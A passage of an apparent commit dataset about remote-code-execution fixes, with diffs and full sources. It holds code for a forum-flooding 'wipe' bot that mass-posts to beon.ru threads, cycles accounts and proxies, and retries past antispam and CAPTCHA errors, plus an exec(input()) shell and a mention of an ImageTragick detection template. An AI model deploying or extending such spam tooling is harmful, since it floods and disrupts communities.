1:\n                    w = workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs,\n                        name='.'.join((wname, 'pr{0}'.format(i))))\n                    self.processes.append(w)\n                    w.start(self.pr_sa)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on %s spawn',\n                                   e, wname)\n\n    def spawn_wipethreads(self):\n        return self.spawn_nworkers(0, WipeThread, self.c.tcount,\n                                  (self.pc, self.spawnqueue))\n\n    def spawn_evaluators(self):\n        self.log.info('Initializing Evaluator')\n        from evproxy import EvaluatorProxy\n        def ev_init():\n            from lib.evaluators.PyQt4Evaluator import Evaluator\n            return Evaluator()\n        return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount,\n                                  (ev_init,))\n\n    def load_users(self):\n        if not os.path.isfile(self.usersfile):\n            return\n        with open(self.usersfile, 'rb') as f:\n            users = pickle.loads(f.read())\n        try:\n            for domain in users.keys():\n                uq = Queue()\n                for ud in users[domain]:\n                    self.log.debug('Loaded user %s:%s', domain, ud['login'])\n                    uq.put(ud)\n                self.userqueues[domain] = uq\n        except Exception as e:\n            self.log.exception(e)\n            self.log.error('Failed to load users')\n\n    def save_users(self):\n        users = {}\n        for d, uq in self.userqueues.items():\n            uqsize = uq.qsize()\n            uds = []\n            for i in range(uqsize):\n                uds.append(uq.get(False))\n            users[d] = uds\n        with open(self.usersfile, 'wb') as f:\n            f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL))\n        self.log.info('Saved users')\n\n    def get_userqueue(self, domain):\n        try:\n            uq = self.userqueues[domain]\n        except KeyError:\n            self.log.info('Created userqueue for %s', domain)\n            uq = Queue()\n            self.userqueues[domain] = uq\n        return uq\n\n    def load_targets(self):\n        fname = self.targetsfile\n        if not os.path.isfile(fname):\n            return\n        with open(fname, 'rb') as f:\n            data = pickle.loads(f.read())\n        if 'targets' in data:\n            self.log.debug('Target list was loaded')\n            targets.update(data['targets'])\n        if 'forums' in data:\n            self.log.debug('Forum set was loaded')\n            forums.update(data['forums'])\n        if 'domains' in data:\n            self.log.debug('Domain set was loaded')\n            domains.update(data['domains'])\n        if 'sets' in data:\n            self.log.debug('Other sets were loaded')\n            self.pc.sets.update(data['sets'])\n\n    def load_bumplimit_set(self):\n        if not os.path.isfile(self.bumplimitfile):\n            return\n        with open(self.bumplimitfile, 'rb') as f:\n            self.pc.sets['bumplimit'].update(pickle.loads(f.read()))\n\n    def save_targets(self):\n        data = {\n            'targets': targets,\n            'forums': forums,\n            'domains': domains,\n            'sets': self.pc.sets,\n            }\n        with open(self.targetsfile, 'wb') as f:\n            f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))\n\n    def targets_from_witch(self):\n        for t in d.witch_targets:\n            if t['domain'] == 'beon.ru' and t['forum'] == 'anonymous':\n                try:\n                    add_target_exc(t['id'], t['user'])\n                except ValueError:\n                    pass\n\n    def terminate(self):\n        msg = [b'GLOBAL']\n        msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate', []))\n        if hasattr(self, 'th_sock'):\n            self.th_sock.send_multipart(msg)\n        if hasattr(self, 'pr_sock'):\n            self.pr_sock.send_multipart(msg)\n\n    def join_threads(self):\n        for t in self.threads:\n            t.join()\n\n    def send_passthrough(self, interface, method, frames):\n        msg = [frames[0]]\n        msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))\n        self.th_sock.send_multipart(msg)\n        self.pr_sock.send_multipart(msg)\n\n    def __call__(self, parent):\n        self.p = parent\n        self.log = parent.log\n        self.inter_sleep = parent.inter_sleep\n        self.running = parent.running\n        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager')\n        self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough)\n        if self.c.tcount > 0:\n            self.pc = ProcessContext(self.p.name, self.p.ctx,\n                self.c.router_addr, noproxy_rp)\n            self.spawnqueue = Queue()\n            self.load_bumplimit_set()\n            self.load_targets()\n            self.load_users()\n            self.spawn_wipethreads()\n        if self.c.ecount > 0:\n            self.spawn_evaluators()\n        try:\n            while self.running.is_set():\n                # self.targets_from_witch()\n                if self.c.tcount == 0:\n                    self.inter_sleep(5)\n                    continue\n                self.pc.check_waiting()\n                new = self.read_newproxies()\n                if not new:\n                    self.inter_sleep(5)\n                    continue\n                self.add_spawns(new)\n        except WorkerInterrupt:\n            pass\n        except Exception as e:\n            self.log.exception(e)\n        self.terminate()\n        self.join_threads()\n        if self.c.tcount > 0:\n            self.save_users()\n            self.save_targets()\n\nwm = workers.WZWorkerThread(c.router_addr, WipeManager, (c,),\n    name='SpaghettiMonster')\nwm.start(ctx, sig_addr)\n\ndef add_target(domain, id_, tuser=None):\n    if domain not in targets:\n        targets[domain] = []\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    logger.info('Appending %s to targets[%s]', repr(t), domain)\n    tlist.append(t)\n\ndef remove_target(domain, id_, tuser=None):\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    logger.info('Removing %s from targets[%s]', repr(t), domain)\n    tlist.remove(t)\n\ndef add_target_exc(domain, id_, tuser=None):\n    if domain not in targets:\n        targets[domain] = []\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    if t in protected:\n        raise ValueError('%s is protected' % repr(t))\n    if t not in tlist:\n        logger.info('Appending %s to targets[%s]', repr(t), domain)\n        tlist.append(t)\n\nr_di = re.compile(regexp.f_udi)\n\ndef atfu(urls):\n    for user, domain, id1, id2 in r_di.findall(urls):\n        id_ = id1+id2\n        add_target(domain, id_, user)\n\ndef rtfu(urls):\n    for user, domain, id1, id2 in r_di.findall(urls):\n        id_ = id1+id2\n        remove_target(domain, id_, user)\n\ndef get_forum_id(name):\n    id_ = d.bm_id_forum.get_key(name)\n    int(id_, 10)  # id is int with base 10\n    return id_\n\n# def aftw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Appending %s (%s) to forums', name, id_)\n#     forums.append(id_)\n\n# def rffw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Removing %s (%s) from forums', name, id_)\n#     forums.remove(id_)\n\n# def aftw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Appending %s to forums', name)\n#     forums.add(name)\n\n# def rffw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Removing %s from forums', name)\n#     forums.remove(name)\n\nr_udf = re.compile(regexp.udf_prefix)\n\ndef affu(urls):\n    for user, domain, forum in r_udf.findall(urls):\n        if domain not in forums:\n            forums[domain] = set()\n        if len(forum) > 0:\n            get_forum_id(forum)\n        logger.info('Appending %s:%s to forums[%s]', user, forum, domain)\n        forums[domain].add((user, forum))\n\ndef rffu(urls):\n    for user, domain, forum in r_udf.findall(urls):\n        if len(forum) > 0:\n            get_forum_id(forum)\n        logger.info('Removing %s:%s from forums[%s]', user, forum, domain)\n        forums[domain].remove((user, forum))\n\ndef add_user(domain, login, passwd):\n    uq = wm.get_userqueue(domain)\n    uq.put({'login': login, 'passwd': passwd}, False)\n\ndef send_to_wm(frames):\n    msg = [frames[0]]\n    msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))\n    sig_sock.send_multipart(msg)\n\ndef send_passthrough(frames):\n    msg = [b'WipeManager']\n    msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))\n    sig_sock.send_multipart(msg)\n\ndef drop_users():\n    send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])\n\ndef log_spawn_name():\n    send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])\n\nif c.no_shell:\n    while True:\n        time.sleep(1)\nelse:\n    try:\n        import IPython\n        IPython.embed()\n    except ImportError:\n        # fallback shell\n        while True:\n            try:\n                exec(input('> '))\n            except KeyboardInterrupt:\n                print(\"KeyboardInterrupt\")\n            except SystemExit:\n                break\n            except:\n                print(traceback.format_exc())\n\nterminate()\n"}, "/uniwipe.py": {"changes": [{"diff": "\n                 self.schedule(self.add_comment, (t, msg))\n                 self.schedule_first(self.switch_user)\n             except exc.EmptyAnswer as e:\n-                self.log.info('Removing %s from targets', t)\n+                self.log.info('Removing %s from targets and adding to bugged', t)\n+                self.pc.sets['bugged'].add(t)\n+                try:\n+                    self.targets.remove(t)\n+                except ValueError as e:\n+                    pass\n+                self.w.sleep(self.errortimeout)\n+            except exc.TopicDoesNotExist as e:\n+                self.log.info('Removing %s from targets and adding to bugged', t)\n+                self.pc.sets['bugged'].add(t)\n                 try:\n                     self.targets.remove(t)\n                 except ValueError as e:\n", "add": 10, "remove": 1, "filename": "/uniwipe.py", "badparts": ["                self.log.info('Removing %s from targets', t)"], "goodparts": ["                self.log.info('Removing %s from targets and adding to bugged', t)", "                self.pc.sets['bugged'].add(t)", "                try:", "                    self.targets.remove(t)", "                except ValueError as e:", "                    pass", "                self.w.sleep(self.errortimeout)", "            except exc.TopicDoesNotExist as e:", "                self.log.info('Removing %s from targets and adding to bugged', t)", "                self.pc.sets['bugged'].add(t)"]}, {"diff": "\n                 self.w.sleep(self.errortimeout)\n \n     def forumwipe_loop(self):\n-        for f in self.forums:\n+        for f in self.forums.copy():\n             self.counter_tick()\n             try:\n                 self.addtopic(self.msgfun(), self.sbjfun(), f)\n", "add": 1, "remove": 1, "filename": "/uniwipe.py", "badparts": ["        for f in self.forums:"], "goodparts": ["        for f in self.forums.copy():"]}, {"diff": "\n             rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))\n             found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))\n             for t in found:\n-                if (t in self.pc.sets['closed']\n-                    or t in self.pc.sets['bumplimit']\n-                    or t in self.targets):\n+                if t in self.ignore_map:\n                     continue\n                 targets.append(t)\n             lt = len(tar", "add": 1, "remove": 3, "filename": "/uniwipe.py", "badparts": ["                if (t in self.pc.sets['closed']", "                    or t in self.pc.sets['bumplimit']", "                    or t in self.targets):"], "goodparts": ["                if t in self.ignore_map:"]}], "source": "\n from sup.net import NetError from wzworkers import WorkerInterrupt from wipeskel import WipeSkel, WipeState, cstate from beon import exc, regexp import re class UniWipe(WipeSkel): def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs): self.sbjfun=sbjfun self.msgfun=msgfun self.forums=forums self.targets=(type(targets)==str and[('', targets)] or type(targets)==tuple and list(targets) or targets) super().__init__(*args, **kvargs) def on_caprate_limit(self, rate): if not self.logined: self._capdata=(0, 0) return self.log.warning('Caprate limit reached, calling dologin() for now') self.dologin() def comment_loop(self): for t in self.targets: self.schedule(self.add_comment,(t, self.msgfun())) if len(self.targets)==0: self.schedule(self.scan_targets_loop) else: self.schedule(self.comment_loop) def add_comment(self, t, msg): if True: try: self.postmsg(t[1], msg, t[0]) except exc.Success as e: self.counters['comments'] +=1 self.w.sleep(self.comment_successtimeout) except exc.Antispam as e: self.w.sleep(self.comment_successtimeout) self.schedule(self.add_comment,(t, msg)) except(exc.Closed, exc.UserDeny) as e: try: self.targets.remove(t) except ValueError: pass self.w.sleep(self.comment_successtimeout) except exc.Captcha as e: self.log.error('Too many wrong answers to CAPTCHA') self.schedule(self.add_comment,(t, msg)) except exc.UnknownAnswer as e: self.log.warn('%s: %s', e, e.answer) self.schedule(self.add_comment,(t, msg)) except exc.Wait5Min as e: self.schedule(self.add_comment,(t, msg)) self.schedule_first(self.switch_user) except exc.EmptyAnswer as e: self.log.info('Removing %s from targets', t) try: self.targets.remove(t) except ValueError as e: pass self.w.sleep(self.errortimeout) except exc.TemporaryError as e: self.schedule(self.add_comment,(t, msg)) self.w.sleep(self.errortimeout) except exc.PermanentError as e: try: self.targets.remove(t) except ValueError as e: pass self.w.sleep(self.errortimeout) except UnicodeDecodeError as e: self.log.exception(e) self.w.sleep(self.errortimeout) def forumwipe_loop(self): for f in self.forums: self.counter_tick() try: self.addtopic(self.msgfun(), self.sbjfun(), f) except exc.Success as e: self.counters['topics'] +=1 self.w.sleep(self.topic_successtimeout) except exc.Wait5Min as e: self.topic_successtimeout=self.topic_successtimeout +0.1 self.log.info('Wait5Min exc caught, topic_successtimeout +0.1, cur: %f', self.topic_successtimeout) self.w.sleep(self.topic_successtimeout) except exc.Captcha as e: self.log.error('Too many wrong answers to CAPTCHA') self.long_sleep(10) except exc.UnknownAnswer as e: self.log.warning('%s: %s', e, e.answer) self.w.sleep(self.errortimeout) except exc.PermanentError as e: self.log.error(e) self.w.sleep(self.errortimeout) except exc.TemporaryError as e: self.log.warn(e) self.w.sleep(self.errortimeout) def get_targets(self): found_count=0 for user, forum in self.forums: targets=[] self.log.debug('Scanning first page of the forum %s:%s', user, forum) page=self.site.get_page('1', forum, user) rxp=re.compile(regexp.f_sub_id.format(user, self.site.domain, forum)) found=set(map(lambda x:(user, x[0]+x[1]), rxp.findall(page))) for t in found: if(t in self.pc.sets['closed'] or t in self.pc.sets['bumplimit'] or t in self.targets): continue targets.append(t) lt=len(targets) found_count +=lt if lt > 0: self.log.info('Found %d new targets in forum %s:%s', lt, user, forum) else: self.log.debug('Found no new targets in forum %s:%s', user, forum) self.targets.extend(targets) return found_count def scan_targets_loop(self): with cstate(self, WipeState.scanning_for_targets): while len(self.targets)==0: c=self.get_targets() if c==0: self.log.info('No targets found at all, sleeping for 30 seconds') self.long_sleep(30) self.schedule(self.comment_loop) if len(self.forums)==0: self.schedule(self.wait_loop) def wait_loop(self): if len(self.targets) > 0: self.schedule(self.comment_loop) return if len(self.forums)==0: with cstate(self, WipeState.waiting_for_targets): while len(self.forums)==0: self.counter_tick() self.w.sleep(1) self.schedule(self.scan_targets_loop) def _run(self): self.schedule(self.dologin) self.schedule(self.wait_loop) self.schedule(self.counter_ticker.tick) try: self.perform_tasks() except NetError as e: self.log.error(e) except WorkerInterrupt as e: self.log.warning(e) except Exception as e: self.log.exception(e) self.return_user() ", "sourceWithComments": "# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom sup.net import NetError\nfrom wzworkers import WorkerInterrupt\nfrom wipeskel import WipeSkel, WipeState, cstate\nfrom beon import exc, regexp\nimport re\n\nclass UniWipe(WipeSkel):\n    def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):\n        self.sbjfun = sbjfun\n        self.msgfun = msgfun\n        self.forums = forums\n        self.targets = (type(targets) == str and [('', targets)]\n                        or type(targets) == tuple and list(targets)\n                        or targets)\n        super().__init__(*args, **kvargs)\n\n    def on_caprate_limit(self, rate):\n        if not self.logined:\n            self._capdata = (0, 0)\n            return\n        self.log.warning('Caprate limit reached, calling dologin() for now')\n        self.dologin()\n        # super().on_caprate_limit(rate)\n\n    def comment_loop(self):\n        for t in self.targets:\n            self.schedule(self.add_comment, (t, self.msgfun()))\n        if len(self.targets) == 0:\n            self.schedule(self.scan_targets_loop)\n        else:\n            self.schedule(self.comment_loop)\n\n    def add_comment(self, t, msg):\n        # with cstate(self, WipeState.posting_comment):\n        if True: # Just a placeholder\n            try:\n                # self.counter_tick()\n                self.postmsg(t[1], msg, t[0])\n            except exc.Success as e:\n                self.counters['comments'] += 1\n                self.w.sleep(self.comment_successtimeout)\n            except exc.Antispam as e:\n                self.w.sleep(self.comment_successtimeout)\n                self.schedule(self.add_comment, (t, msg))\n            except (exc.Closed, exc.UserDeny) as e:\n                try:\n                    self.targets.remove(t)\n                except ValueError:\n                    pass\n                self.w.sleep(self.comment_successtimeout)\n            except exc.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.schedule(self.add_comment, (t, msg))\n            except exc.UnknownAnswer as e:\n                self.log.warn('%s: %s', e, e.answer)\n                self.schedule(self.add_comment, (t, msg))\n            except exc.Wait5Min as e:\n                self.schedule(self.add_comment, (t, msg))\n                self.schedule_first(self.switch_user)\n            except exc.EmptyAnswer as e:\n                self.log.info('Removing %s from targets', t)\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except exc.TemporaryError as e:\n                self.schedule(self.add_comment, (t, msg))\n                self.w.sleep(self.errortimeout)\n            except exc.PermanentError as e:\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except UnicodeDecodeError as e:\n                self.log.exception(e)\n                self.w.sleep(self.errortimeout)\n\n    def forumwipe_loop(self):\n        for f in self.forums:\n            self.counter_tick()\n            try:\n                self.addtopic(self.msgfun(), self.sbjfun(), f)\n            except exc.Success as e:\n                self.counters['topics'] += 1\n                self.w.sleep(self.topic_successtimeout)\n            except exc.Wait5Min as e:\n                self.topic_successtimeout = self.topic_successtimeout + 0.1\n                self.log.info('Wait5Min exc caught, topic_successtimeout + 0.1, cur: %f',\n                    self.topic_successtimeout)\n                self.w.sleep(self.topic_successtimeout)\n            except exc.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.long_sleep(10)\n            except exc.UnknownAnswer as e:\n                self.log.warning('%s: %s', e, e.answer)\n                self.w.sleep(self.errortimeout)\n            except exc.PermanentError as e:\n                self.log.error(e)\n                self.w.sleep(self.errortimeout)\n            except exc.TemporaryError as e:\n                self.log.warn(e)\n                self.w.sleep(self.errortimeout)\n\n    def get_targets(self):\n        found_count = 0\n        for user, forum in self.forums:\n            targets = []\n            self.log.debug('Scanning first page of the forum %s:%s', user, forum)\n            page = self.site.get_page('1', forum, user)\n            rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))\n            found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))\n            for t in found:\n                if (t in self.pc.sets['closed']\n                    or t in self.pc.sets['bumplimit']\n                    or t in self.targets):\n                    continue\n                targets.append(t)\n            lt = len(targets)\n            found_count += lt\n            if lt > 0:\n                self.log.info('Found %d new targets in forum %s:%s', lt, user, forum)\n            else:\n                self.log.debug('Found no new targets in forum %s:%s', user, forum)\n            self.targets.extend(targets)\n        return found_count\n\n    def scan_targets_loop(self):\n        with cstate(self, WipeState.scanning_for_targets):\n            while len(self.targets) == 0:\n                c = self.get_targets()\n                if c == 0:\n                    self.log.info('No targets found at all, sleeping for 30 seconds')\n                    self.long_sleep(30)\n            self.schedule(self.comment_loop)\n        if len(self.forums) == 0:\n            self.schedule(self.wait_loop)\n\n    def wait_loop(self):\n        if len(self.targets) > 0:\n            self.schedule(self.comment_loop)\n            return\n        if len(self.forums) == 0:\n            with cstate(self, WipeState.waiting_for_targets):\n                while len(self.forums) == 0:\n                    # To prevent a busy loop.\n                    self.counter_tick()\n                    self.w.sleep(1)\n        self.schedule(self.scan_targets_loop)\n\n    def _run(self):\n        self.schedule(self.dologin)\n        self.schedule(self.wait_loop)\n        self.schedule(self.counter_ticker.tick)\n        try:\n            self.perform_tasks()\n        except NetError as e:\n            self.log.error(e)\n        except WorkerInterrupt as e:\n            self.log.warning(e)\n        except Exception as e:\n            self.log.exception(e)\n        self.return_user()\n# tw_flag = False\n# if len(self.targets) > 0:\n#     with cstate(self, WipeState.posting_comment):\n#         while len(self.targets) > 0:\n#             self.threadwipe_loop()\n#     if not tw_flag:\n#         tw_flag = True\n# if tw_flag:\n#     # Sleep for topic_successtimeout after last comment\n#     # to prevent a timeout spike\n#     self.w.sleep(self.topic_successtimeout)\n#     tw_flag = False\n# with cstate(self, WipeState.posting_topic):\n# self.forumwipe_loop()\n"}, "/wipeskel.py": {"changes": [{"diff": "\n         self.zmq_ctx = ctx\n         self.ticker = Ticker()\n         self.sets = {}\n-        self.sets['targets'] = set()\n         self.sets['waiting'] = dict()\n         self.sets['pending'] = set()\n+\n+        self.sets['targets'] = set()\n         self.sets['closed'] = set()\n         self.sets['bumplimit'] = set()\n         self.sets['protected'] = set()\n+        self.sets['bugged'] = set()\n+\n         self.wz_addr = wz_addr\n         self.noproxy_rp = noproxy_rp\n \n", "add": 4, "remove": 1, "filename": "/wipeskel.py", "badparts": ["        self.sets['targets'] = set()"], "goodparts": ["        self.sets['targets'] = set()", "        self.sets['bugged'] = set()"]}, {"diff": "\n         result = []\n         def accept(that, reqid, seqnum, status, data):\n             if status == wzrpc.status.success or status == wzrpc.status.error:\n-                result.extend(map(lambda x:x.decode('utf-8'), data))\n+                result.extend(map(lambda x: x.decode('utf-8'), data))\n             elif status == wzrpc.status.e_req_denied:\n-                self.log.warn('Status {0}, reauthentificating'.\\\n+                self.log.warn('Status {0}, reauthentificating'.\n                     format(wzrpc.name_status(status)))\n                 self.p.auth_requests()\n                 that.retry = True\n", "add": 2, "remove": 2, "filename": "/wipeskel.py", "badparts": ["                result.extend(map(lambda x:x.decode('utf-8'), data))", "                self.log.warn('Status {0}, reauthentificating'.\\"], "goodparts": ["                result.extend(map(lambda x: x.decode('utf-8'), data))", "                self.log.warn('Status {0}, reauthentificating'."]}, {"diff": "\n         with cstate(self, WipeState.registering):\n             _regcount = 0\n             while self.w.running.is_set():\n-                self.w.p.poll()\n+                self.w.p.poll(0)\n                 ud = self.gen_userdata()\n                 self.request_email(ud)\n                 for c in self.hooks['pre_register_new_user']:\n", "add": 1, "remove": 1, "filename": "/wipeskel.py", "badparts": ["                self.w.p.poll()"], "goodparts": ["                self.w.p.poll(0)"]}, {"diff": "\n     def postmsg(self, target, msg, tuser=None, **kvargs):\n         tpair = (tuser, target)\n         target = target.lstrip('0')\n-        ptarget = (':'.join(tpair) if tuser else target)\n         try:\n             try:\n                 self.site.ajax_addcomment(target, msg, tuser, **kvargs)\n", "add": 0, "remove": 1, "filename": "/wipeskel.py", "badparts": ["        ptarget = (':'.join(tpair) if tuser else target)"], "goodparts": []}]}}, "msg": "Title for GitHub\nFunctions and handlers for remote code execution and other updates to wzworkers were merged. poll(0) was added to WipeSkel.register_new_user to check for signals in loop. Dynamic ChainMap ignore_map was added to UniWipe for target checking.\nMinor stylistic changes according to pep8."}}, "https://github.com/resamsel/dbmanagr": {"4e30f3a631dcf6c78ff296338bbe20b8c06bb524": {"url": "https://api.github.com/repos/resamsel/dbmanagr/commits/4e30f3a631dcf6c78ff296338bbe20b8c06bb524", "html_url": "https://github.com/resamsel/dbmanagr/commit/4e30f3a631dcf6c78ff296338bbe20b8c06bb524", "message": "Chg: Disables code coverage check on remote execution (daemon), because it cannot be tested reliably. The daemon forks a new process, which also affects the currently running tests. They get executed two times, in parallel, as soon as the daemon forks. Currently, I see no possibility to avoid this behaviour (other than to mock the daemon in tests).", "sha": "4e30f3a631dcf6c78ff296338bbe20b8c06bb524", "keyword": "remote code execution check", "diff": "diff --git a/src/dbnav/wrapper.py b/src/dbnav/wrapper.py\nindex 961e50e..6ec1c76 100644\n--- a/src/dbnav/wrapper.py\n+++ b/src/dbnav/wrapper.py\n@@ -57,7 +57,9 @@ def execute(self):  # pragma: no cover\n \n     def run(self):\n         try:\n-            if self.options is not None and self.options.daemon:\n+            if (\n+                    self.options is not None\n+                    and self.options.daemon):  # pragma: no cover\n                 log.logger.debug('Executing remotely')\n                 return self.executer(*sys.argv)\n \n@@ -69,13 +71,13 @@ def run(self):\n                 # Start post mortem debugging only when debugging is enabled\n                 if os.getenv('UNITTEST', 'False') == 'True':\n                     raise\n-                if self.options.trace:\n-                    pdb.post_mortem(sys.exc_info()[2])  # pragma: no cover\n+                if self.options.trace:  # pragma: no cover\n+                    pdb.post_mortem(sys.exc_info()[2])\n             else:\n                 # Show the error message if log level is INFO or higher\n                 log.log_error(e)  # pragma: no cover\n \n-    def executer(self, *args):\n+    def executer(self, *args):  # pragma: no cover\n         \"\"\"Execute remotely\"\"\"\n \n         options = self.options\n", "files": {"/src/dbnav/wrapper.py": {"changes": [{"diff": "\n \n     def run(self):\n         try:\n-            if self.options is not None and self.options.daemon:\n+            if (\n+                    self.options is not None\n+                    and self.options.daemon):  # pragma: no cover\n                 log.logger.debug('Executing remotely')\n                 return self.executer(*sys.argv)\n \n", "add": 3, "remove": 1, "filename": "/src/dbnav/wrapper.py", "badparts": ["            if self.options is not None and self.options.daemon:"], "goodparts": ["            if (", "                    self.options is not None", "                    and self.options.daemon):  # pragma: no cover"]}, {"diff": "\n                 # Start post mortem debugging only when debugging is enabled\n                 if os.getenv('UNITTEST', 'False') == 'True':\n                     raise\n-                if self.options.trace:\n-                    pdb.post_mortem(sys.exc_info()[2])  # pragma: no cover\n+                if self.options.trace:  # pragma: no cover\n+                    pdb.post_mortem(sys.exc_info()[2])\n             else:\n                 # Show the error message if log level is INFO or higher\n                 log.log_error(e)  # pragma: no cover\n \n-    def executer(self, *args):\n+    def executer(self, *args):  # pragma: no cover\n         \"\"\"Execute remotely\"\"\"\n \n         options = self.options\n", "add": 3, "remove": 3, "filename": "/src/dbnav/wrapper.py", "badparts": ["                if self.options.trace:", "                    pdb.post_mortem(sys.exc_info()[2])  # pragma: no cover", "    def executer(self, *args):"], "goodparts": ["                if self.options.trace:  # pragma: no cover", "                    pdb.post_mortem(sys.exc_info()[2])", "    def executer(self, *args):  # pragma: no cover"]}], "source": "\n import sys import os import logging import pdb import urllib2 import json import ijson from dbnav.writer import Writer from dbnav import logger as log from dbnav.jsonable import from_json COMMANDS={ 'dbdiff': 'differ', 'dbexec': 'executer', 'dbexport': 'exporter', 'dbgraph': 'grapher', 'dbnav': 'navigator' } class Wrapper(object): def __init__(self, options=None): self.options=options def write(self): try: sys.stdout.write(Writer.write(self.run())) except BaseException as e: log.logger.exception(e) return -1 return 0 def execute(self): \"\"\"To be overridden by sub classes\"\"\" pass def run(self): try: if self.options is not None and self.options.daemon: log.logger.debug('Executing remotely') return self.executer(*sys.argv) log.logger.debug('Executing locally') return self.execute() except BaseException as e: log.logger.exception(e) if log.logger.getEffectiveLevel() <=logging.DEBUG: if os.getenv('UNITTEST', 'False')=='True': raise if self.options.trace: pdb.post_mortem(sys.exc_info()[2]) else: log.log_error(e) def executer(self, *args): \"\"\"Execute remotely\"\"\" options=self.options try: url='http://{host}:{port}/{path}'.format( host=options.host, port=options.port, path=COMMANDS[options.prog]) request=json.dumps(args[1:]) log.logger.debug('Request to %s:\\n%s', url, request) response=urllib2.urlopen(url, request) for i in ijson.items(response, 'item'): yield from_json(i) except urllib2.HTTPError as e: raise from_json(json.load(e)) except urllib2.URLError as e: log.logger.error('Daemon not available: %s', e) except BaseException as e: log.logger.exception(e) ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# Copyright \u00a9 2014 Ren\u00e9 Samselnig\n#\n# This file is part of Database Navigator.\n#\n# Database Navigator is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Database Navigator is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Database Navigator.  If not, see <http://www.gnu.org/licenses/>.\n#\n\nimport sys\nimport os\nimport logging\nimport pdb\nimport urllib2\nimport json\nimport ijson\n\nfrom dbnav.writer import Writer\nfrom dbnav import logger as log\nfrom dbnav.jsonable import from_json\n\nCOMMANDS = {\n    'dbdiff': 'differ',\n    'dbexec': 'executer',\n    'dbexport': 'exporter',\n    'dbgraph': 'grapher',\n    'dbnav': 'navigator'\n}\n\n\nclass Wrapper(object):\n    def __init__(self, options=None):\n        self.options = options\n\n    def write(self):\n        try:\n            sys.stdout.write(Writer.write(self.run()))\n        except BaseException as e:\n            log.logger.exception(e)\n            return -1\n        return 0\n\n    def execute(self):  # pragma: no cover\n        \"\"\"To be overridden by sub classes\"\"\"\n        pass\n\n    def run(self):\n        try:\n            if self.options is not None and self.options.daemon:\n                log.logger.debug('Executing remotely')\n                return self.executer(*sys.argv)\n\n            log.logger.debug('Executing locally')\n            return self.execute()\n        except BaseException as e:\n            log.logger.exception(e)\n            if log.logger.getEffectiveLevel() <= logging.DEBUG:\n                # Start post mortem debugging only when debugging is enabled\n                if os.getenv('UNITTEST', 'False') == 'True':\n                    raise\n                if self.options.trace:\n                    pdb.post_mortem(sys.exc_info()[2])  # pragma: no cover\n            else:\n                # Show the error message if log level is INFO or higher\n                log.log_error(e)  # pragma: no cover\n\n    def executer(self, *args):\n        \"\"\"Execute remotely\"\"\"\n\n        options = self.options\n\n        try:\n            # from dbnav import daemon\n            # if not daemon.is_running(options):\n            #     daemon.start_server(options)\n\n            url = 'http://{host}:{port}/{path}'.format(\n                host=options.host,\n                port=options.port,\n                path=COMMANDS[options.prog])\n            request = json.dumps(args[1:])\n\n            log.logger.debug('Request to %s:\\n%s', url, request)\n\n            response = urllib2.urlopen(url, request)\n\n            for i in ijson.items(response, 'item'):\n                yield from_json(i)\n        except urllib2.HTTPError as e:\n            raise from_json(json.load(e))\n        except urllib2.URLError as e:\n            log.logger.error('Daemon not available: %s', e)\n        except BaseException as e:\n            log.logger.exception(e)\n"}}, "msg": "Chg: Disables code coverage check on remote execution (daemon), because it cannot be tested reliably. The daemon forks a new process, which also affects the currently running tests. They get executed two times, in parallel, as soon as the daemon forks. Currently, I see no possibility to avoid this behaviour (other than to mock the daemon in tests)."}}, "https://github.com/neoblackied/ATT5": {"3ba30040d60a72fcf1a831635fa2ce43bc857073": {"url": "https://api.github.com/repos/neoblackied/ATT5/commits/3ba30040d60a72fcf1a831635fa2ce43bc857073", "html_url": "https://github.com/neoblackied/ATT5/commit/3ba30040d60a72fcf1a831635fa2ce43bc857073", "message": "Added detection of vulnerable ImageMagick\n\nAdded a new template named \"imagetragick\" that detects if the file\nupload is vulnerable to CVE-2016-3714, which is a Remote Code Execution\nvulnerability in the ImageMagick software. By uploading a crafted file\nit is possible to run arbitrary commands on the server if vulnerable.\nThe command performed by the template on vulnerable servers creates a\nfile with the text \"ImageTragick Detected!\" in the same directory as the\nupload form 